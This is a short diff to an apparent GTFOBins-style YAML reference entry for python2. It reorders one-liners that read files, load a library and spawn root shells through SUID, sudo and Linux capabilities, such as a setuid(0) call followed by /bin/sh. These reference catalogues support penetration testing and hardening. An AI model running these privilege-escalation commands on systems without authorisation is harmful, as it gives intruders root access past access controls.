@@ -30,10 +30,10 @@ functions:
     - code: python2 -c 'open("file_to_read").read()'
   load-library:
     - code: python2 -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
-  capabilities-enabled:
-    - code: ./python2 -c 'import os; os.setuid(0); os.system("/bin/sh")'
   suid-enabled:
     - code: ./python2 -c 'import os; os.system("/bin/sh -p")'
   sudo-enabled:
     - code: sudo python2 -c 'import os; os.system("/bin/sh")'
+  capabilities-enabled:
+    - code: ./python2 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ---
